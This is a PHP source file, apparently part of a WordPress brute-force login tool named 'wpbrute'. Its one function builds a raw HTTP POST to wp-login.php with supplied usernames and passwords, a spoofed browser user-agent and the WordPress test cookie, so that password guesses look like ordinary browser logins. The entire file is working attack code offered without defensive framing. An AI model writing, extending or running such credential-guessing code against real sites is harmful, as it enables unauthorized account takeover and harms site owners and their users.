<?php

function wpbrute_packet($sUser,$sPass) {
	
	global $wpbrute;
	
	//Return a packet that will query wp-login.php with credentials.
	$packet = array();
	
	$packet['data'] = "log=".urlencode($sUser)."&pwd=".urlencode($sPass)."&wp-submit=Log+In&redirect_to=".urlencode($wpbrute['target_wpadmin'])."&testcookie=1";	
	
	$packet['header'] = "POST ".$wpbrute['target_request']." HTTP/1.1\r\n";
	$packet['header'] .= "Host: ".$wpbrute['target_host']."\r\n";
	$packet['header'] .= "User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)\r\n";
	$packet['header'] .= "Accept: text/html\r\n";
	$packet['header'] .= "Accept-Language: en-US,en;q=0.5\r\n";
	$packet['header'] .= "Referer: ".$wpbrute['target_full_url']."\r\n";
	$packet['header'] .= "Cookie: wordpress_test_cookie=WP+Cookie+check\r\n";
	$packet['header'] .= "Connection: close\r\n";
	$packet['header'] .= "Content-Type: application/x-www-form-urlencoded\r\n";
	$packet['header'] .= "Content-Length: ".strlen($packet['data'])."\r\n\r\n";
	
	return $packet;
}

?>